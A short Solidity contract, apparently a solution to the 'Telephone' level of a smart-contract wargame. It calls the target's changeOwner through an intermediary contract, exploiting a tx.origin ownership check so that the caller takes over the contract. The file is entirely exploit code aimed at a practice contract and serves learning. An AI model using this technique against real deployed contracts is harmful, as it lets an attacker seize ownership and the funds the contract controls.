// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'contracts/src/levels/Telephone.sol';

contract TelephoneHack {
    function changeOwner(address victim) public {
        Telephone telephoneContract = Telephone(victim);
        telephoneContract.changeOwner(msg.sender);
    }
}
